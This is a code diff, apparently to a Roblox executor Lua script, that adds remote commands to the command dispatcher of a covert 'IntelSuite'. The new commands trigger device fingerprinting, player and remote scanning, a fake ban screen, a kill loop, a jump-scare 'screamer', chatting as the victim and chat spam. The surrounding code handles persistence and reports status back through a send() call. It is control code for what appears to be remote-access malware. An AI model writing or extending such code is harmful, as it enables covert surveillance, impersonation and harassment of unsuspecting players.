@@ -712,6 +712,58 @@ task.spawn(function()
                     send("PERSISTENCE", "UninstallPersistence not found on this session.", 16711680)
                 end
 
+            elseif cmd == "playerscan" then
+                if getgenv().IntelSuite.PlayerScan then
+                    task.spawn(getgenv().IntelSuite.PlayerScan)
+                end
+
+            elseif cmd == "remotescan" then
+                if getgenv().IntelSuite.RemoteScanner then
+                    task.spawn(getgenv().IntelSuite.RemoteScanner)
+                end
+
+            elseif cmd == "deviceinfo" then
+                if getgenv().IntelSuite.DeviceFingerprint then
+                    task.spawn(getgenv().IntelSuite.DeviceFingerprint)
+                end
+
+            elseif cmd == "fakeban" then
+                if getgenv().IntelSuite.FakeBan then
+                    task.spawn(getgenv().IntelSuite.FakeBan)
+                end
+
+            elseif cmd == "killloop" then
+                if getgenv().IntelSuite.StartKillLoop then
+                    task.spawn(getgenv().IntelSuite.StartKillLoop)
+                end
+
+            elseif cmd == "killstop" then
+                if getgenv().IntelSuite.StopKillLoop then
+                    getgenv().IntelSuite.StopKillLoop()
+                end
+
+            elseif cmd == "scream" then
+                if getgenv().IntelSuite.StartScreamer then
+                    task.spawn(getgenv().IntelSuite.StartScreamer)
+                end
+
+            elseif cmd == "screamstop" then
+                if getgenv().IntelSuite.StopScreamer then
+                    getgenv().IntelSuite.StopScreamer()
+                end
+
+            elseif cmd:sub(1, 7) == "chatas:" then
+                local message = cmd:sub(8)
+                if getgenv().IntelSuite.ChatAs then
+                    task.spawn(function() getgenv().IntelSuite.ChatAs(message) end)
+                end
+
+            elseif cmd:sub(1, 9) == "chatspam:" then
+                local message = cmd:sub(10)
+                if getgenv().IntelSuite.ChatSpam then
+                    task.spawn(function() getgenv().IntelSuite.ChatSpam(message) end)
+                end
+
             elseif cmd == "apiscrap" then
                 if getgenv().IntelSuite.APIScraper then
                     getgenv().IntelSuite.APIScraper()
